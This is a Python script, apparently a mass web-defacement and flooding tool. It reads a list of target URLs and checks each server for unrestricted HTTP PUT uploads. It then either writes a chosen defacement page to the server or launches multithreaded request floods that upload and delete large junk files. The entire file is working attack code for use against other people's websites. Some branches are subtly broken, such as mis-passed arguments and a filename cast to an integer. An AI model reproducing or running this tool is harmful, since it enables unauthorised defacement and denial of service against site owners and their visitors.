import requests,string,random,json,time,threading
from colored import fg,attr
content_default = '<html><head><title>DEFACE BY ./TEST</title></head><body><h1>YOU WEBSITE CAN UPLOAD FILE WITH PUT METHOD HTTP</h1></body></html>'

def generate_string(letter=string.ascii_letters + string.digits + string.punctuation + ' ',num=1): return "".join(random.choice(letter) for _ in range(num))

def text_to_hex(data):
   hex_sequences = ["\\x61 \\x62 \\x63 \\x64 \\x65 \\x66 \\x67 \\x68 \\x69 \\x6a \\x6b \\x6c \\x6d \\x6e \\x6f \\x70 \\x71 \\x72 \\x73 \\x74 \\x75 \\x76 \\x77 \\x78 \\x79 \\x7a","\\x41 \\x42 \\x43 \\x44 \\x45 \\x46 \\x47 \\x48 \\x49 \\x4a \\x4b \\x4c \\x4d \\x4e \\x4f \\x50 \\x51 \\x52 \\x53 \\x54 \\x55 \\x56 \\x57 \\x58 \\x59 \\x5a","\\x30 \\x31 \\x32 \\x33 \\x34 \\x35 \\x36 \\x37 \\x38 \\x39","\\x00 \\x21 \\x22 \\x23 \\x24 \\x25 \\x26 \\x27 \\x28 \\x29 \\x2a \\x2b \\x2c \\x2d \\x2e \\x2f \\x3a \\x3b \\x3c \\x3d \\x3e \\x3f \\x40 \\x5b \\x5c \\x5d \\x5e \\x5f \\x60 \\x7b \\x7c \\x7d \\x7e \\x20"]; json_data = {}
   for sequence in hex_sequences:
    characters = sequence.split()
    for char in characters:hex_char = char.strip(); data_char = bytes.fromhex(hex_char[2:]).decode('utf-8'); json_data[data_char] = hex_char
   json_string = json.dumps(json_data, indent=2); test = json.loads(json_string); chara = test.keys(); data2 = ''
   for a in data:
      for c in chara:
         if a == c:data2 += test[c]
   return data2

ex = ["txt","exe","md","wav","mp3","gif","xml","moz","mp4","sh","bat","zip","rar","pdf","xlsx","pptx","docx","js","jpg","java","css","php","png","html","htm","hta"]

def content_create():
   all = string.ascii_letters + string.digits + string.punctuation + ' กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ'
   title = generate_string(letter=all, num=random.randint(1,99999)); h1 = generate_string(letter=all,num=random.randint(1,99999)); junk_content = random.randint(1,10); junk = ''
   for _ in range(junk_content):
      junk += generate_string(letter=all,num=random.randint(1,99999))
      junk += '<br>'
   junk_hex = random.randint(1,10); junk_h = ''
   for _ in range(junk_hex):junk_h += text_to_hex(generate_string(num=random.randint(1,999999))); junk_h += '<br>'
   content_create = f'<html><head><title>{title}</title></head><body><h1>{h1}</h1><hr>{junk}{junk_h}FLOODING</body></html>'
   return content_create

def defacement_flooder(target,countdown,booter):
   global ex
   attack_left = time.time()+countdown
   while time.time() < attack_left:
      try:
         for _ in range(booter):text = content_create().encode('utf-8'); name = random.choice((generate_string(letter=string.ascii_letters+string.digits+'_-',num=random.randint(1,35)),'index'))+'.'+random.choice((ex)); requests.put(target+name,data=text); requests.get(target+name);requests.put(target+name);requests.post(target+name);requests.patch(target+name); requests.delete(target+name);requests.options(target+name)
      except Exception as e:pass

def thread_flooder(threader,t,countdown,booter):
   for _ in range(threader):
      for _ in range(5):
         threading.Thread(target=defacement_flooder,args=(t,countdown,booter)).start()

def defacement(url,files):
   try:
      with open(files,'r') as f:content = f.read()
   except Exception as e:print(f'[❌] {fg(226)}NOT FOUND {fg(255)}--> {fg(227)}{files}{attr(0)}')
   try:
      r = requests.put(url+files,data=content)
      checking = requests.get(url+files)
      if checking.content.decode() == content:print(f'[✅] {fg(70)}DEFACE {fg(255)}--> {fg(71)}{url}{files} {fg(72)}CODE{fg(255)}={fg(73)}{checking.status_code}:{checking.reason}{attr(0)}')
      else:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}CODE{fg(255)}={fg(199)}{checking.status_code}:{checking.reason}{attr(0)}')
   except Exception as e:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}ERROR{fg(255)}={fg(199)}{e}{attr(0)}')

def test_defacepage(url,mode,command=''):
   global content_default
   try:
      files_name = generate_string(letter=string.ascii_letters+string.digits+'_',num=random.randint(1,25))+'.html'
      r = requests.put(url+files_name,timeout=3,data=content_default)
      raw = requests.get(url+files_name)
      if raw.content.decode() == content_default:
         if mode == 0:
            test = input(f"{url} {fg(70)}DOS {fg(71)}OR {fg(72)}DEFACE {fg(73)}?{fg(255)}").upper()
            if test == 'DOS':
             countdown = int(input(f"{fg(70)}TIME {fg(71)}?{fg(255)}"))
             thread = int(input(f"{fg(70)}THREAD {fg(71)}?{fg(255)}"))
             booter = int(input(f"{fg(70)}BOOTER {fg(71)}?{fg(255)}"))
             th = threading.Thread(target=thread_flooder,args=(thread,url,countdown,booter)); th.start()
            else:
               files = int(input(f"{fg(70)}DEFACE PAGE FILE {fg(71)}?{fg(255)}{attr(0)}"))
               th = threading.Thread(target=thread_flooder,args=(url,files)); th.start()
         elif mode == 1:
            th = threading.Thread(target=thread_flooder,args=(int(command.split(' ')[0]),url,int(command.split(' ')[1]),int(command.split(' ')[2]))); th.start()
         elif mode == 2:
            th = threading.Thread(target=defacement,args=(url,command.split(' ')[0])); th.start(); th.join()
         elif mode == 3:print(f'[✅] {fg(70)}DEFACE {fg(255)}--> {fg(71)}{url}{files_name} {fg(72)}CODE{fg(255)}={fg(73)}{raw.status_code}:{raw.reason}{attr(0)}')
         else:
            print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files_name} {fg(198)}NOT FOUND{fg(255)}={fg(199)}MODE{attr(0)}')
      else:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files_name} {fg(198)}CODE{fg(255)}={fg(199)}{raw.status_code}:{raw.reason}{attr(0)}')
   except Exception as e:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files_name} {fg(198)}ERROR{fg(255)}={fg(199)}{e}{attr(0)}')

print(f'''{fg(255)} ___________________________________ ______________________
 \\                                  | (_)     (_)    (_)   \\
  `.                                |  __________________   )
    `-..........................____|_(                  )_/
{fg(70)}╔╦╗╔═╗╔═╗╔═╗╔═╗╔═╗ {fg(196)}╦ ╦╦ ╦╔╗ ╦╦═╗╔╦╗
{fg(71)} ║║║╣ ╠╣ ╠═╣║  ║╣  {fg(197)}╠═╣╚╦╝╠╩╗║╠╦╝ ║║
{fg(72)}═╩╝╚═╝╚  ╩ ╩╚═╝╚═╝{fg(255)}o{fg(198)}╩ ╩ ╩ ╚═╝╩╩╚══╩╝{attr(0)}''')
files_list = input(f'{fg(70)}TARGET {fg(71)}FILES {fg(72)}?{fg(255)}')
print(f'''{fg(74)}0 CHOOSE {fg(72)}1 AUTO DOS_REQ {fg(71)}2 AUTO DEFACE {fg(70)}3 SKIP {attr(0)}''')
mode = int(input(f"{fg(70)}MODE {fg(71)}?{fg(255)}"))
command = ''
if mode == 1:
   countdown = int(input(f"{fg(70)}TIME {fg(71)}?{fg(255)}"))
   thread = int(input(f"{fg(70)}THREAD {fg(71)}?{fg(255)}"))
   booter = int(input(f"{fg(70)}BOOTER {fg(71)}?{fg(255)}"))
   command = f'{thread} {countdown} {booter}'
elif mode == 2:
   files = int(input(f"{fg(70)}DEFACE PAGE FILE {fg(71)}?{fg(255)}{attr(0)}"))
   command = f'{files} 0'

def reader(a,mode,command):
   link = a.replace('\n','').replace('\t','')
   link = link.replace('https://','http://')
   test = link.replace('http://','').split('/')
   url = test[0]
   if url.startswith('http://') is False: url = 'http://'+url
   if url.endswith('/') is False:url += '/'
   th = threading.Thread(target=test_defacepage,args=(url,mode,command))
   th.start()
   th.join()

try: 
 with open(files_list,'r') as f:
   for a in f.readlines():
      th = threading.Thread(target=reader,args=(a,mode,command))
      th.start(); th.join()
except:
   try:
    with open(files_list,'rb') as f:
     for a in f.readlines():
      th = threading.Thread(target=reader,args=(a.decode(),mode,command))
      th.start(); th.join()
   except:print(f'[❌] {fg(226)}NOT FOUND {fg(255)}--> {fg(227)}{files_list}{attr(0)}')
